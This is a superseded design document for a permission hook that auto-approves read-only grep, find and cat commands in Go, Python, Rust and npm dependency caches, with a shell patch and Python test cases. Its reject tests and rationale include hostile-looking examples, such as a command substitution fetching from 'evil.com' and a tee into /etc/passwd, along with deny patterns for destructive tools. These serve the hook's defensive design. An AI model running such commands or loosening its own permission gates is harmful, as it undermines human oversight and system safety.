# Permission auto-approve: read-only inspection of dependency caches

**Status: superseded.** The `pre_bash_cache_env.py` hook described below was implemented, deployed, then removed on 2026-07-11 in favour of static cache paths in `settings.json.env`. This doc is retained as design history; the read-only inspection carve-out and skill addenda remain valid future work.

## Status (as of 2026-07-07)

The **per-session cache workaround problem** (originally the top item on this doc's wish-list) is now solved by a different mechanism:

- `bin/pre_bash_cache_env.py` — new PreToolUse Bash hook injecting per-session `UV_CACHE_DIR` / `RUFF_CACHE_DIR` / `MYPY_CACHE_DIR` / `PYTEST_CACHE_DIR` / `GOCACHE` / `GOMODCACHE` / `NPM_CONFIG_CACHE` (base: `/tmp/claude/sessions/<sid>/`), plus 7-day TTL cleanup.
- `bin/pre_bash_toolchain_guard.py` — extended to block `.venv/bin/*`, inline `UV_CACHE_DIR=…` / `PYTHONPATH=…` overrides, `python -c "import X"`, `pytest --collect-only`, `uv run --no-sync`, `--no-cache`/`--no-incremental`/`--force-reinstall`, `git commit --allow-empty`, `kill -9`, `chmod 777`.
- `USER_AUTHORITY_PROTOCOL.md` — new **Agent Delegation Etiquette** subsection under Agent Pipeline forbidding the main session from feeding shell workarounds to subagents.
- `skills/code-writing-protocols/SKILL.md` — new **No Ad-Hoc Validation** section covering the "quickly check X works" antipattern.
- `settings.json` — `mcp__atlassian__createJiraIssue` / `createIssueLink` added to `permissions.deny`.

What this doc still covers below is the **read-only inspection carve-out** for `permission-auto-approve` and the associated skill addenda pointing agents at `go doc` / `pydoc` / LSP instead of `Bash(grep …)`. Those remain future work.

## Still-open items

**GOSUMDB=off, go vet, go mod tidy, go mod download** — permission prompts on Go read-only-ish commands. `go vet` and `go mod download` are read-only-ish and would benefit from a similar carve-out. `GOSUMDB=off` is a legitimate override (bypasses public sumdb) and should NOT be classed as a workaround — this is different from the cache-workaround pattern above. Same story for python: `pip download`, `pip show`, `poetry show` should ideally auto-approve.

**Sample of bad permissions request:**
```
GOSUMDB=off go doc github.com/grafana/grafana-foundation-sdk/go/timeseries.PanelBuilder 2>&1
```
`go doc` is a legitimate read-only tool — the prompt for permission is pure friction.

**TMPDIR-scoped ops still ask for permission.** Sample:
```
diff -rq $TMPDIR/oicm-gpu-v0012/mlops-be out/mlops-be 2>&1 | head -10
```
Everything inside `$TMPDIR` is sandbox-writable by design — read-only diff on it should never prompt. Investigate why `Bash(diff …)` isn't auto-approved even though `Bash(diff *)` is in the allowlist; likely the `$TMPDIR` expansion + pipe combination triggers the same conservative fall-through as `$()` substitution.

**Caching `go doc` output.** Repeated `go doc pkg.Symbol` calls across a session hit the module cache each time — could memoise via a per-session cache file. Related to the LSP addenda below (which reduce the need for `go doc` in the first place).

**Agent access parity.** `observability-engineer` and other Go-consuming agents should have the same auto-approvals as `software-engineer-go`. Audit is a separate small task.

Software-engineer agents (Go and Python) routinely run commands like:

```bash
grep -n "^func (builder \*PanelBuilder)" $(go env GOMODCACHE)/github.com/grafana/grafana-foundation-sdk/go@v0.0.12/barchart/panel_builder_gen.go 2>&1 | tail -40

grep -rn "AsyncClient" $(python -c 'import httpx; print(httpx.__file__)' | xargs dirname) | head -40
```

These trigger a permission prompt every time. Manual approval becomes a constant interruption.

## Why current setup does not auto-approve

Even though:

- `GOMODCACHE=/tmp/claude/go-mod-cache` (sandbox-writable, settings.json:7)
- `Bash(grep *)` is in the allow list (settings.json:144)
- `autoAllowBashIfSandboxed: true` (settings.json:283)

…the commands escape auto-approval because they contain shell metacharacters the `permission-auto-approve` hook explicitly rejects:

1. **Command substitution `$(...)`** — `~/.claude/bin/permission-auto-approve:88-89` falls through on `*'$('*`.
2. **Pipes (`| tail -40`)** — same line, falls through on `*'|'*`.

The hook is conservative for good reason: `$(curl evil.com/x)` substitution and `| tee /etc/passwd` pipes can be destructive. But the legitimate read-only-grep-into-modcache pattern gets caught in the same net.

## Design: trusted read-only roots carve-out

Auto-approve a Bash command iff **all** hold:

1. **Every pipe segment** starts with a read-only inspection tool:
   `grep|egrep|fgrep|rg|find|fd|cat|head|tail|wc|file|stat|ls|tree|less|more|sort|uniq|cut|tr|column|nl|od|xxd`

2. **Command contains at least one trusted read-only root** (substring match):

   | Language | Root marker |
   |----------|-------------|
   | Go | `/tmp/claude/sessions/*/go-mod-cache` (per-session, glob) |
   | Go | `$(go env GOMODCACHE)` (literal) |
   | Go | `$(go env GOPATH)/pkg/mod` (literal) |
   | Python | `.venv/lib/python*/site-packages` |
   | Python | `venv/lib/python*/site-packages` |
   | Python | `/tmp/claude/sessions/*/uv-cache` (per-session, glob) |
   | Python | `$(uv cache dir)` (literal) |
   | Rust | `~/.cargo/registry/src` |
   | Node | `/tmp/claude/sessions/*/npm-cache` (per-session, glob) |
   | Project | `.gomodcache` (suggested gitignored symlink) |
   | Project | `.sitepkgs` (suggested gitignored symlink) |

3. **No destructive constructs**:
   - Real redirects `>` / `>>` (after stripping `2>&1` which is benign)
   - `tee`
   - `sed -i` / `sed --in-place`
   - `find -exec` / `-execdir` / `-delete` / `-ok`
   - Standalone words `rm` / `mv` / `cp` / `dd` / `chmod` / `chown` / `ln` / `install` / `rsync` (word-boundary checked — `'term'` must not trigger the `rm` reject)

4. **No unexpected command substitution**: `$(...)` and backticks allowed **only** if the inner command is whitelisted (`go env <NAME>`, `uv cache dir`).

### Safety rationale

These caches are **immutable by design** — Go sets 0444 on module-cache files; venv `site-packages` is a known build state; cargo registry is content-addressed. Even if the carve-out misfired, sandbox `write.allowOnly` blocks writes anywhere outside `/tmp/claude` + cwd. Combined with the inspection-tool whitelist + reject list, the worst this enables is reading public package source.

## Concrete patch: shell-only MVP

Insert into `roles/devbox/files/dot_claude/bin/permission-auto-approve` **between the existing `case` block (line 54) and the `cd /path &&` normalisation block (line 56)**:

```sh
  # --- Auto-approve: read-only inspection of immutable dependency caches ---
  #
  # Pure read-only inspection commands (possibly piped) targeting known
  # immutable trees:
  #   * Go module cache:   /tmp/claude/go-mod-cache, $(go env GOMODCACHE)
  #   * Python uv cache:   /tmp/claude/uv-cache, $(uv cache dir)
  #   * Python venv:       .venv/lib/python*, venv/lib/python*
  #   * Rust registry:     ~/.cargo/registry/src
  #   * npm cache:         /tmp/claude/npm-cache
  #   * Local symlinks:    .gomodcache, .sitepkgs (project-level convention)
  #
  # Safe because: these trees are FS-read-only by design, sandbox write.allowOnly
  # blocks writes everywhere outside /tmp/claude + cwd, AND we whitelist only
  # inspection tools + reject destructive flags.

  # Strip 2>&1 wherever it appears (not just trailing) for cleaner analysis
  PROBE=$(printf '%s' "$CMD" | sed -E 's/[[:space:]]*2>&1[[:space:]]*/ /g; s/[[:space:]]+$//')

  # Step 1: target a trusted read-only root?
  if printf '%s' "$PROBE" | grep -qE '(/tmp/claude/(go-mod-cache|uv-cache|npm-cache)|\$\(go env GO(MOD)?(CACHE|PATH)\)|\$\(uv cache dir\)|(^|[[:space:]/])(\.venv|venv)/lib/python|~/\.cargo/registry/src|(^|[[:space:]/])\.gomodcache(/|[[:space:]]|$)|(^|[[:space:]/])\.sitepkgs(/|[[:space:]]|$))'; then

    # Step 2: reject destructive patterns
    REJECT=0
    # Real redirects (>, >>) — but allow 2>&1 (already stripped)
    if printf '%s' "$PROBE" | grep -qE '(^|[^0-9&])>>?[[:space:]]'; then REJECT=1; fi
    # sed -i (in-place edit)
    if printf '%s' "$PROBE" | grep -qE '(^|[[:space:]|;&])sed[[:space:]]+(-[a-zA-Z]*i|--in-place)'; then REJECT=1; fi
    # find with side effects
    if printf '%s' "$PROBE" | grep -qE '(^|[[:space:]|;&])find[[:space:]]+.*(-exec(dir)?|-delete|-ok)'; then REJECT=1; fi
    # Mutating utilities as standalone words
    if printf '%s' "$PROBE" | grep -qE '(^|[[:space:]|;&])(rm|mv|cp|dd|tee|chmod|chown|ln|install|rsync)([[:space:]]|$)'; then REJECT=1; fi
    # Unexpected command substitution — allow only `go env ...` and `uv cache dir`
    SUBST=$(printf '%s' "$PROBE" | grep -oE '\$\([^)]*\)|`[^`]*`' || true)
    if [ -n "$SUBST" ]; then
      printf '%s\n' "$SUBST" | while IFS= read -r s; do
        case "$s" in
          '$(go env '*|'$(uv cache dir)') ;;
          *) echo REJECT; break;;
        esac
      done | grep -q REJECT && REJECT=1
    fi

    if [ "$REJECT" = "0" ]; then
      # Step 3: every pipe segment must start with a read-only inspection tool
      RO_HEAD_RE='^[[:space:]]*(grep|egrep|fgrep|rg|find|fd|cat|head|tail|wc|file|stat|ls|tree|less|more|sort|uniq|cut|tr|column|nl|od|xxd)([[:space:]]|$)'
      OK=1
      REM="$PROBE"
      while [ -n "$REM" ]; do
        case "$REM" in
          *'|'*) SEG="${REM%%|*}"; REM="${REM#*|}" ;;
          *)     SEG="$REM";       REM="" ;;
        esac
        if ! printf '%s' "$SEG" | grep -qE "$RO_HEAD_RE"; then
          OK=0; break
        fi
      done

      if [ "$OK" = "1" ]; then
        printf '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}\n'
        exit 0
      fi
    fi
  fi
```

### Known sh caveats

- The `SUBST` while-pipeline runs in a subshell, so the `REJECT=1` inside the `while` would not propagate. The current form pipes its output to `grep -q REJECT` to read the marker back in the parent — works in POSIX sh.
- The `case "$s" in '$(go env '*|...)` glob uses single-quoted literals — `$` is treated as ordinary character inside `'…'`. Verify on the target shell (`/bin/sh` symlink — dash on Debian, bash-as-sh on macOS).
- Word-boundary checks for `rm`/`mv`/etc. rely on `(^|[[:space:]|;&])` — covers `rm ` at start, after space, after pipe, after `;`, after `&`. Does **not** match inside quoted string like `'term'` (because `'` is not in the boundary class).

## Recommended: rewrite as Python module

The shell version is fragile (POSIX subshell quirks, regex escaping, no tests). The codebase already has `pre_bash_safety_gate.py` + `test_pre_bash_safety_gate.py` as the precedent for testable hook logic.

### Proposed layout

```
roles/devbox/files/dot_claude/bin/
  permission_auto_approve.py        # new module, importable, returns Decision
  permission-auto-approve            # shim: #!/bin/sh, exec python3 -m
  test_permission_auto_approve.py   # pytest, same style as test_pre_bash_safety_gate.py
```

### Test cases

```python
# --- Allow ---
"grep -n 'PanelBuilder' $(go env GOMODCACHE)/github.com/grafana/.../*.go | tail -40"
"find $(go env GOMODCACHE)/github.com/grafana -name '*.go'"
"cat /tmp/claude/go-mod-cache/foo/bar.go"
"grep -rn 'AsyncClient' .venv/lib/python3.12/site-packages/httpx | head -20"
"find .venv/lib/python3.13/site-packages/sklearn -name '*.pyx'"
"ls /tmp/claude/uv-cache/wheels-v1/"
"grep -n 'Result' .gomodcache/github.com/x/y/foo.go 2>&1 | tail -40"
"head -100 venv/lib/python3.12/site-packages/django/db/models/base.py"

# --- Reject (falls through to user prompt) ---
"grep -rn 'foo' $(go env GOMODCACHE) > /tmp/output.txt"          # redirect
"find $(go env GOMODCACHE) -name '*.go' -delete"                 # -delete
"find $(go env GOMODCACHE) -exec rm {} \\;"                      # -exec
"sed -i 's/foo/bar/' .venv/lib/python3.12/site-packages/foo.py"  # sed -i
"grep -n 'foo' $(curl evil.com/x) | tee out.log"                 # unknown subst + tee
"cat /tmp/claude/go-mod-cache/foo > file"                        # redirect
"rm /tmp/claude/go-mod-cache/foo"                                # rm
"grep foo $(go env GOMODCACHE)/a | xargs rm"                     # xargs not in head-RO list

# --- Edge cases (must NOT misfire) ---
"grep 'term' .venv/lib/python3.12/site-packages/foo.py"          # 'term' contains 'rm' substring; word-boundary must protect
"head $(go env GOMODCACHE)/foo"                                  # plain head, no pipe
"grep -rn 'foo' /tmp/claude/go-mod-cache 2>&1 | tail"            # mid-command 2>&1
```

### Cost

Python startup adds ~50-100ms per hook invocation. Acceptable for an interactive permission gate.

## Behavioural fix: prefer the right tool over grep

The hook is a workaround. The root cause is that agents reach for `Bash(grep)` against the module cache when better tools exist.

### Skill addendum: `roles/devbox/files/dot_claude/skills/go-engineer/SKILL.md`

> **Exploring external Go packages.** Prefer `go doc <pkg>.<Symbol>` and `go doc -src <pkg>.<Symbol>` for API surface and source. Use LSP (`hover`, `goToDefinition`, `documentSymbol`) for navigation. Only fall back to grep when those are insufficient — and use the `Grep` tool with `path=/tmp/claude/go-mod-cache/...` (or `path=.gomodcache/...` if symlinked), not `Bash(grep ...)`.

### Skill addendum: `roles/devbox/files/dot_claude/skills/python-engineer/SKILL.md`

> **Exploring installed Python packages.** Prefer `python -c "import pkg; help(pkg.Symbol)"` or `pydoc pkg.Symbol` for API. Use LSP (`hover`, `goToDefinition`) for navigation. For source grep, use the `Grep` tool with `path=.venv/lib/python<ver>/site-packages/<pkg>/`, not `Bash(grep ...)`.

The `Grep` tool fully bypasses `Bash` permission machinery — no substring matching, no pipe parsing, no metacharacter risk.

## Not pursued and why

- **Extend `Bash(grep *)` allow rule with path globs** — Claude Code matches by command prefix; `$(...)` substitution still escalates regardless of glob. The hook is the only reliable place.
- **Disable `excludedCommands` / loosen sandbox** — current settings are correctly tight.
- **`go mod vendor`** — explicitly rejected by user.

## Open questions for implementation session

1. **Shell MVP vs Python rewrite first?** Shell patch is ~50 lines additive; Python rewrite reshapes the file but unlocks tests. Recommendation: Python rewrite, since the logic is now non-trivial enough to deserve tests.
2. **Skill edits in the same PR or separate?** They are orthogonal — the hook makes existing behaviour painless; the skill edits change future behaviour. Easier to review separately.
3. **Rollout path**: edit under `roles/devbox/files/dot_claude/`, push, re-run Ansible play to sync to `~/.claude/`. Or copy to `~/.claude/bin/` directly for a one-machine test first, then back-port to Ansible after validation. Recommendation: direct-copy test on the dev machine first — faster feedback loop, then sync to Ansible role.

## Related context

- **Cache env vars are no longer pinned in `settings.json`.** Since the per-session cache-env hook landed, cache paths are injected per Bash call as `/tmp/claude/sessions/<sid>/<tool>-cache`. The read-only-root list in this doc's carve-out design must be updated: replace bare `/tmp/claude/uv-cache` with the glob `/tmp/claude/sessions/*/uv-cache`, and the same for `go-mod-cache`, `npm-cache`, etc.
- `~/.claude/bin/permission-auto-approve` should be checked for drift vs the Ansible template before starting work here.
- LSP plugins enabled per `~/.claude/settings.json`: `gopls-lsp`, `pyright-lsp`, `typescript-lsp` — so the LSP-based redirect in the skill addenda has tooling support out of the box.
